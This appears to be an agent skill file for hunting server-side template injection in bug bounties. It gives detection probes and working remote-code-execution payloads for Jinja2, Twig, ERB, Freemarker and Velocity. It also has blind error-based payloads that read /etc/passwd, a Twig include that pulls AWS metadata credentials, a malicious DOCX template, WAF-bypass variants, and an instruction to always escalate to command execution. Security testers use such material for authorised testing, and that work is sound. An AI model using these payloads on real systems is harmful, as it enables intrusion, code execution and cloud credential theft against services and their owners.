---
name: hunt-ssti
description: "Hunt server-side template injection (SSTI) across Jinja2 (Flask/Django), Twig (Symfony), Freemarker (Java), ERB (Rails), Spring, Velocity, Mako, Thymeleaf, Smarty. Detection probes use double-curly and dollar-curly math expressions evaluated server-side. Once an engine is fingerprinted, escalate to RCE via the engine-specific class-walker, callback-registrar, or Execute-utility patterns documented in disclosed reports. Detection patterns: error messages reveal engine, blank or numeric eval reveals expression mode. Targets: email templates, PDF/report generators, CMS preview features, error pages with user input. Use when hunting RCE via template rendering, when content shows engine fingerprints, when finding endpoints that compose strings with user input before render."
---

## 14. SSTI — SERVER-SIDE TEMPLATE INJECTION
> Easy to detect, high payout ($2K–$8K). Direct path to RCE.

### Detection Payloads (try all)
```
{{7*7}}          → 49 = Jinja2 / Twig
${7*7}           → 49 = Freemarker / Velocity / Mako (all use ${...})
<%= 7*7 %>       → 49 = ERB (Ruby)
*{7*7}           → 49 = Spring Thymeleaf
{{7*'7'}}        → 7777777 = Jinja2 (Python string repetition); 49 = Twig (numeric coercion of '7'). Differentiates Jinja2 from Twig.
```

### RCE Payloads

**Jinja2 (Python/Flask):**
```python
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

**Twig (PHP/Symfony):**
```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

**ERB (Ruby):**
```ruby
<%= `id` %>
```

### Where to Test
```
Name/bio/description fields, email templates, invoice name, PDF generators,
URL path parameters, search queries reflected in results, HTTP headers reflected
```

### Blind SSTI — Error-Based Oracle ("Successful Errors", 2025)
> When the render output is NOT reflected back (email/PDF/report generators that only return "sent/queued"), you can still extract data by forcing the engine into a RUNTIME error whose message ECHOES the evaluated expression — the same error-based extraction trick long used for blind SQLi, applied to templates. #1 in PortSwigger's Top-10 Web-Hacking-Techniques-2025 (Vladislav Korchagin). Source: https://github.com/vladko312/Research_Successful_Errors

- **Principle:** the app suppresses normal output but surfaces (or logs, or 500s with) parser/runtime exceptions. Make the engine evaluate `<secret>` and then throw an error that includes the evaluated value in its text — the error message is your blind oracle. Works even when no numeric/string reflection ever comes back.
- **Detection polyglot** (fire in any field; a differential 500 / distinct error string vs a benign value = evaluation happening):
  ```
  ${{<%[%'"}}%\    →  broad multi-engine syntax-error trigger; a template parse error (not a generic 400) = the value hits a template engine
  ```
- **Turn eval into an echoing error (engine-specific):**
  ```jinja2
  {{ ''.__class__.__mro__[1].__subclasses__()[X] }}      # bad index → IndexError text leaks the list; walk X to enumerate gadgets blind
  {{ self.__init__.__globals__.__builtins__.open('/etc/passwd').read()[999999] }}  # slice OOB → error embeds read content
  ```
  ```twig
  {{ ('id'|filter) }}   # unknown-filter exception echoes the attempted callable/value in the message
  ```
  General recipe: coerce the target expression into a type/format/index/undefined-name error whose stringified exception includes the expression's value (division-by-a-computed-value, out-of-range index/slice, "no such attribute/filter '<value>'", type-mismatch concatenation). Read the leaked bytes out of the error body.
- **Confirm before claiming RCE:** an error-oracle proves server-side evaluation and blind data extraction — escalate to `id`/OOB-DNS with a unique marker (still non-destructive) to prove code exec; a pure error-leak is data-disclosure-grade until then. A ready toolkit with per-engine error payloads exists at the source repo above.

---

## Related Skills & Chains

- **`hunt-rce`** — SSTI is the easiest path to RCE on Python/Ruby/PHP/Java stacks because the template language already exposes the runtime. Chain primitive: Jinja2 `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` or Freemarker `<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}` → unauthenticated RCE as the rendering worker. Always escalate fingerprint → class-walker → cmd exec.
- **`hunt-xss`** — When the template engine sandboxes the runtime (or you only get the rendered output back as HTML), the same `{{7*7}}` reflection often still yields stored XSS. Chain primitive: sandboxed Jinja2 SSTI without escapes → inject `<script>` into rendered email template → stored XSS hitting every recipient who views the message.
- **`hunt-ssrf`** — Template engines often expose URL fetchers/filters before they expose the runtime, giving you SSRF before RCE. Chain primitive: Twig `{{ include('http://169.254.169.254/latest/meta-data/iam/security-credentials/') }}` or Jinja2 with `url_for`/custom filters → AWS metadata exfil → cloud creds.
- **`hunt-file-upload`** — Office docs, SVGs, and email templates uploaded by the user are common SSTI surfaces (the server re-renders them). Chain primitive: upload a DOCX whose `word/document.xml` contains `${T(java.lang.Runtime).getRuntime().exec("id")}` to a Velocity/Freemarker-driven mail-merge → RCE.
- **`security-arsenal`** — Reach for the engine-specific escape payload tree: Jinja2 class-walker variants (`__subclasses__()[N]` index hunting), Twig `_self.env` registerUndefinedFilterCallback, Freemarker `?new()` Execute, ERB backticks, Velocity `$class.inspect`, Smarty `{php}...{/php}`, plus the WAF-bypass variants (`{{request|attr('application')|...}}`, Unicode escapes, `{%print(...)%}`).
- **`triage-validation`** — Apply the Pre-Severity Gate before claiming Critical RCE. A `{{7*7}} → 49` reflection inside a sandboxed engine (e.g., Twig sandbox mode, Jinja2 SandboxedEnvironment with no escape) is Medium SSTI, not Critical RCE. Prove `id`/OOB DNS callback with a unique marker before writing the report.
